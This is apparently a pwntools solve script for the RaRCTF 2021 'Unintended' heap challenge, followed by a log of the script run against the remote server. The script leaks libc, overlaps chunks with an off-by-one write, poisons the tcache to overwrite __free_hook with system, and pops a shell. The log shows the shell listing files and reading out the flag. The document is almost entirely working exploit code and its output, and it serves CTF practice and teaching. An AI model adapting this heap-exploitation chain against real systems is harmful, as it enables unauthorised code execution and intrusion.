from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './unintended'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "193.57.159.27"
  PORT = 29070
  s = remote(HOST, PORT)
  libc = ELF("lib/libc.so.6")
else:
  #s = process(BINARY)
  s = process(BINARY, env={'LD_PRELOAD': 'lib/libc.so.6'})
  #libc = elf.libc
  libc = ELF("lib/libc.so.6")

def Make(idx, category, name, length, desc, point):
  s.sendlineafter("> ", "1")
  s.sendlineafter("number: ", str(idx))
  s.sendlineafter("category: ", category)
  s.sendlineafter("name: ", name)
  s.sendlineafter("length: ", str(length))
  if length != 0:
    s.sendlineafter("description: ", desc)
  s.sendlineafter("Points: ", str(point))

def Patch(idx, desc):
  s.sendlineafter("> ", "2")
  s.sendlineafter("number: ", str(idx))
  s.sendafter("description: ", desc)

def Deploy(idx):
  s.sendlineafter("> ", "3")
  s.sendlineafter("number: ", str(idx))
  
def Take_Down(idx):
  s.sendlineafter("> ", "4")
  s.sendlineafter("number: ", str(idx))
  
def GC():
  s.sendlineafter("> ", "4")

Make(0, "web", "A"*8, 0x18, "/bin/sh\x00", 0x1)
Make(1, "web", "B"*8, 0x420, "b"*0x17, 0x2)
Make(2, "web", "C"*8, 0x18, "c"*0x17, 0x3)

Take_Down(1)
Make(3, "web", "D"*8, 0x18, "d"*0x17, 0x4)
Make(4, "", "E"*8, 0x18, "e"*0x17, 0x5)
Make(5, "web", "F"*8, 0x18, "f"*0x17, 0x5)

#libc leak
Deploy(4)
s.recvuntil("Category: ")
r = s.recvuntil("\nN")[:-2]
libc_leak   = u64(r + "\x00\x00")
libc_base   = libc_leak - 0x3ebc0a
free_hook   = libc_base + libc.sym.__free_hook
system_addr = libc_base + libc.sym.system
print "libc_leak =", hex(libc_leak)
print "libc_base =", hex(libc_base)

# Overlap chunk
Patch(3, "d"*0x18+"\xf1")
Take_Down(4)
Take_Down(3)
Take_Down(5)

# tcache poisoning
Make(6, "web", "G"*8, 0xe0, "g"*0xa0+p64(free_hook), 0x6)
Make(7, "web", "H"*8, 0x18, "d"*0x17, 0x7)
Make(3, "web", "I"*8, 0x18, p64(system_addr), 0x8)

# Start /bin/sh
Take_Down(0)

s.interactive()

'''
mito@ubuntu:~/CTF/RaRCTF_2021/Pwn_Unintended_400$ python solve.py r
[*] '/home/mito/CTF/RaRCTF_2021/Pwn_Unintended_400/unintended'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  './lib'
[+] Opening connection to 193.57.159.27 on port 29070: Done
[*] '/home/mito/CTF/RaRCTF_2021/Pwn_Unintended_400/lib/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_leak = 0x7fe6ab605c0a
libc_base = 0x7fe6ab21a000
[*] Switching to interactive mode
$ id
uid=1000(clubby) gid=1000(clubby) groups=1000(clubby)
$ ls -l
total 40
-rwxr-x---. 1 root clubby    55 Aug  1 17:59 flag_0eff9e0ad1.txt
drwxr-x---. 1 root clubby    41 Aug  6 16:41 lib
-rwxr-x---. 1 root clubby 32792 Aug  6 16:41 unintended
$ cat flag*
rarctf{y0u_b3tt3r_h4v3_us3d_th3_int3nd3d...89406fae76}
'''
